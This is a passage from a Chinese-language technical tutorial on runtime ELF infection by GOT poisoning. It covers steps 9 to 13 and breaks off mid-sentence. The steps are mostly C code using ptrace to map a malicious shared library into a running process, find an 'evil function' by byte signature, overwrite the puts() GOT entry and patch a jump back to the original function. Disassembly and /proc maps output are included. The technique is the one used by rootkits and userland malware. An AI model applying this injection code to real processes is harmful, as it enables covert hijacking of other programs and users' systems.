  ptrace(PTRACE_POKETEXT, pid, offset + 20, segment.text_off & ~(PAGE_SIZE - 1));
  ptrace(PTRACE_SETREGS, pid, NULL, &reg);
  ptrace(PTRACE_GETREGS, pid, NULL, &reg);

  for (i=0; i<5; i++)
  {
    ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
    wait(NULL);
    ptrace(PTRACE_GETREGS, pid, NULL, &reg);
    if (reg.eax != SYS_mmap)
      evil_base = reg.eax;
  }

  reg.eip = sysenter;
  reg.eax = SYS_mmap;
  reg.ebx = offset;

  ptrace(PTRACE_POKETEXT, pid, offset, 0);
  ptrace(PTRACE_POKETEXT, pid, offset + 4, segment.data_len + (PAGE_SIZE - (segment.data_len & (PAGE_SIZE -1))));
  ptrace(PTRACE_POKETEXT, pid, offset + 8, 3);
  ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);
  ptrace(PTRACE_POKETEXT, pid, offset + 16, fd);
  ptrace(PTRACE_POKETEXT, pid, offset + 20, segment.data_off & ~(PAGE_SIZE -1));
  ptrace(PTRACE_SETREGS, pid, NULL, &reg);
  ptrace(PTRACE_SETREGS, pid, NULL, &reg);

  for(i=0; i<5; i++)
  {
    ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
    wait(NULL);
  }
  printf("Restoring data segment\n");
  for(i=0; i<strlen(library_string) + 32; i++)
    ptrace(PTRACE_POKETEXT, pid, (data_segment + i), *(long*)(orig_ds + i));
  reg.eip = eip;
  reg.eax = eax;
  reg.ebx = ebx;
  reg.ecx = ecx;
  reg.edx = edx;
  reg.esp = esp;

  ptrace(PTRACE_SETREGS, pid, NULL, &reg);
  ptrace(PTRACE_DETACH, pid, NULL, NULL);

}

关于获取sysenter的最后一个要点是：
    另一个定位sysenter的方法是解析进程的栈获取AUXVAT_SYSINFO的入口，这个入口要么包含sysenter的地址或者它附近的地址，我没有尝试过这种方法，我偶然发现这种方法是有可能可行的。


Step 9

    为了执行我们的衍生代码，也就是我们的替代函数，我们必须定位被映射到目标进程内存映像的动态库的基地址。进程的内存映像显示在/proc/<pid>/maps中，我们映射的动态库也在其中，因此解析这个文件就足够了，我们的动态库叫"libtest.so.1.0"
08048000-08049000 r-xp 00000000 08:03 4786267    /home/elf/got_hijack/test

08049000-0804a000 r--p 00000000 08:03 4786267    /home/elf/got_hijack/test

0804a000-0804b000 rw-p 00001000 08:03 4786267    /home/elf/got_hijack/test

b7ddf000-b7de0000 rw-p b7ddf000 00:00 0

b7de0000-b7f0a000 r-xp 00000000 08:03 378946     /lib/libc-2.6.1.so

b7f0a000-b7f0c000 r--p 0012a000 08:03 378946     /lib/libc-2.6.1.so

b7f0c000-b7f0d000 rw-p 0012c000 08:03 378946     /lib/libc-2.6.1.so

b7f0d000-b7f11000 rw-p b7f0d000 00:00 0


/* if we do this the grsec way, you want the base of the text */

/* and you will see two mappings for libtest.so.1.0, the text */

/* will be maped as r-xp and the data will be rw-p */

b7f1b000-b7f1d000 rwxp 00000000 08:03 4786297    /home/elf/libtest.so.1.0

b7f1d000-b7f1e000 rw-p b7f1d000 00:00 0

b7f1e000-b7f38000 r-xp 00000000 08:03 378903     /lib/ld-2.6.1.so

b7f38000-b7f39000 r--p 00019000 08:03 378903     /lib/ld-2.6.1.so

b7f39000-b7f3a000 rw-p 0001a000 08:03 378903     /lib/ld-2.6.1.so

bfb24000-bfb39000 rw-p bffeb000 00:00 0          [stack]

ffffe000-fffff000 r-xp 00000000 00:00 0          [vdso]

    可以看到基地址为b7f1b000. 一个在hijacker中用到的获取这个地址的简单函数将稍候给出，重点需要注意的是如果内核有grsec补丁，那么这些地址将不能从/proc/<pid>/maps文件中得到，这样我们就必须在mmap动态库之后从eax中获取。


Step 10
    现在我们有动态库的基地址了，我们需要定位其中的evil function从而将它保存到GOT中，同样我们也需要给evil function打补丁，将原函数的地址写到它的转移代码(transfer code)中，这样我们才能从evil function 跳回到原函数。(记住：transfer code 处在evil function的最后，要么是一个jump或者是一个函数指针)
    一种寻找evil function的方法是扫描内存，通过寻找它的特征代码来找到它，我们可以使用开头的8个字节作为特征代码：

int evilprint(char *buf)
{
  char new_string[5];
  new_string[0] = 'e';
  new_string[1] = 'v';
  new_string[2] = 'i';
  new_string[3] = 'l';
  new_string[4] = 0;

  int (*origfunc)(char *p) = 0x00000000;
  origfunc(new_string);
}

使用objdump我们可以反汇编它并发现它的特征代码

00000248 <evilprint>:
 248:   55                      push   %ebp
 249:   89 e5                   mov    %esp,%ebp
 24b:   83 ec 18                sub    $0x18,%esp
 24e:   c6 45 f7 65             movb   $0x65,-0x9(%ebp) 
 252:   c6 45 f8 76             movb   $0x76,-0x8(%ebp) 
 256:   c6 45 f9 69             movb   $0x69,-0x7(%ebp)
 25a:   c6 45 fa 6c             movb   $0x6c,-0x6(%ebp)
 25e:   c6 45 fb 00             movb   $0x0,-0x5(%ebp)
 262:   c7 45 fc 00 00 00 00    movl   $0x0,-0x4(%ebp)
 269:   83 ec 0c                sub    $0xc,%esp
 26c:   8d 45 f7                lea    -0x9(%ebp),%eax
 26f:   50                      push   %eax
 270:   8b 45 fc                mov    -0x4(%ebp),%eax
 273:   ff d0                   call   *%eax
 275:   83 c4 10                add    $0x10,%esp
 278:   c9                      leave
 279:   c3                      ret

    开头的3个字节"\x55\x89\xe5"是标准的函数开场白，那么我们用它们来标示一个函数的开始，包含接下来的5个字节也可以。这样我们就有了一个独一无二的特征代码来标示我们的衍生代码在内存中的开始位置。

unsigned char evilsig[] = "\x55\x89\xe5\x83\xec\x18\xc6\x45";

    使用一个大一些的特征代码也许更加明智，但是在我们的例子中动态库非常小从而可以保证开头的8个自己只存在于我们的函数中。为了获取evil function的地址，我们只需要使用ptrace PEEKTEXT来将我们的动态库从进程映像读到buffer中：

for (i=0, j=0; i<size; i+=sizeof(uint32_t), j++)
{
  if (((data = ptrace(PTRACE_PEEKTEXT, pid, vaddr + i)) == -1) && errno)
  {
    return -1;
  }
  buf[j] = data;
}

然后寻找我们的特征代码：
for(i = 0; i < LIBSIZE; i++)
{
  if (buf[i] == evilsig[0] && buf[i+1]==evilsig[1] && buf[i+2] == evilsig[2] && buf[i+3] == evilsig[3] && buf[i+4] == evilsig[4] && buf[i+5] == buf[i+6] && buf[i+7] == evilsig[7])
  {
    evilvaddr = (vaddr + i);
    break;
  }
}

    另一个获取函数地址的方法更加简单也更好，通过找到evil function在动态库中的offset，因为它是静态的，因此 eviladdr = base + offst


Step 11-13
    除了要将GOT entry用evil function的地址覆盖，我们还要将evil function的transfer code用原函数地址打上补丁。如果我们退回去反汇编evil function "evilprint"，我们会发现第9行代码的transfer code需要打补丁：
262:   c7 45 fc 00 00 00 00    movl   $0x0,-0x4(%ebp)

这行反汇编是由我们C中的函数指针赋值生成的：
int (*origfunc)(char *p) = 0x00000000;

    我们需要在evil function中定位它并将它用原函数的地址覆盖，我们怎样才能得到原函数了？如果你还记得，在step2中get_plt()函数将会获取重定位条目，这些条目中包含了GOT中的virtual address/offsets，在那里我们能找我们需要的。
    使用我写的一些代码我们可以获取进程的重定位偏移(relocation offsets)，它们的值和对应的符号(symbol)，我们可以在test程序运行时看一下它的数据：

r_offset: 804a000
symbol:   __gmon_start__
export address: 8048306

r_offset: 804a004
symbol:   __libc_start_main
export address: b7dd5f00

r_offset: 804a008
symbol:   sleep
export address: b7e4dbb0

r_offset: 804a00c
symbol:   puts
export address: b7e185c0

    上面显示的是什么？ r_offset(relocation offset:重定位偏移)是GOT中的地址，导出的地址(export address)就保存在那里,如果你注意到puts()的导出地址是b7e185c0，那就是libc中的解析地址(resolved address in libc).我是怎么知道这个的？因为Lazy linking, 在puts()被第一次调用之前，它将包含一个"桩地址"(stub address)，这个"桩地址"指回了PLT,且它以"804"开头.

    因此我们的目标是获取GOT表中puts()的地址r_offset，下面是一个例子：
if ((lp = (struct linking_info *)get_plt(mem)) == NULL)
{
  printf("get_plt() failed\n");
  goto done;
}
for (i = 0; i < lp[0].count; i++)
{
  if (strcmp(lp[i].name, "puts") == 0)
  {
    /*
     * memrw() uses ptrace to perform several tasks, including retrieving the original function address from the GOT, and overwriting it with the new function (evilprint) address the memrw() MODIFY_GOT request will return the final value of the GOT entry, which should contain the address of the new function, this way we can check to make sure its been properly updated. 
     */
    export = memrw(NULL, lp[i].offset, MODIFY_GOT, pid, evilfunc);
    if (export == evilfunc)
      printf("Successfully modified GOT entry\n\n");
    else
    {
      printf("Failed at modifying GOT entry\n");
      goto done;
    }
    printf("New GOT value: %x\n", export);
  }
 }

    我们现在已经获取了原函数的地址，并将GOT entry修改为我们的evil function. 我们接下来要进行最后一步并给evil function的transfer code打补丁.我们需要使用memrw()函数(源代码)来读取evil function，然后定位打补丁的地址.
    记住我们的transfer code 的特征码： c7 45 fc 00 00 00 00, 我们将用原函数地址覆盖"\xc7\x45\xfc"之后的4个"\x00\x00\x00\x00".

unsigned char evil_code[256];
unsigned long injection_vaddr = 0;
unsigned char tc[] = "\xc7\x45\xfc\x00";
memrw((unsigned long *)evil_code, evilfunc, 256, pid, 0);
for (i=0; i<256; i++)
{
  if (evil_code[i] == tc[0] && evil_code[i+1] == tc[1] && evil_code[i+2] == tc[2] && evil_code[i+3] == tc[3])
  {
    printf("\n Located transfer code; patching it with %x\n",original);
    injection_vaddr = (evilfunc + i) + 3;
    break;
  }
}

At this point we can patch it with:

